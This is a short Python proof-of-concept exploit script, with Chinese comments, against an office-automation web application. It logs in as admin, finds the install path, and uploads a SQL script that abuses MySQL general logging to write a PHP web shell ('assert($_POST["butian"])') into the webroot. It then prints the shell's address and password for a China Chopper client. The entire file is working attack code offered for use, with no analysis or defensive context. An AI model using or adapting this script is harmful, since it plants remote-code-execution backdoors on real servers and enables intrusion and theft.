# -*- coding: utf-8 -*-

import requests, sys, argparse, re, base64
from urllib import parse


def getshell(url, username='admin', password=''):
    r = requests.Session()
    r.post(url + '/logincheck.php', data={'UNAME':'admin','PASSWORD': password,'encode_type':'1'}, timeout=10)
    c = r.get(url + '/general/system/reg_view/').text
    try:
        install_path = re.findall(r'>(\w:\\.*?)</td>', c)[-1]
    except:
        install_path = re.findall(r'>(\w:/.*?)</td>', c)[-1]
    # 创建1.sql脚本
    data = '''set global general_log='on';\nSET global general_log_file='%s/webroot/index1.php';\nSELECT '<?php assert($_POST["butian"]);?>';\nset global general_log='off';''' % install_path.replace(
        "\\", '/')
    with open('1.sql', 'w', encoding='utf-8') as f:
        f.write(data)

    # 上传1.sql脚本
    files = {'sql_file': ('1.sql', open(r'1.sql', 'r'), 'application/octet-stream')}
    r3 = r.post(url + '/general/system/database/sql.php', files=files)
    print("菜刀连接地址：%s/index1.php\t菜刀连接密码：butian" % url)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="example python poc.py -u http://baidu.com -p 123456")
    parser.add_argument("-p", "--password")
    args = parser.parse_args()
    url = args.url.strip('/')
    if args.password:
        password = args.password
        password = base64.b64encode(password.encode('utf-8')).decode('utf-8')
    else:
        password = ''

    getshell(url, username='admin', password=password)


    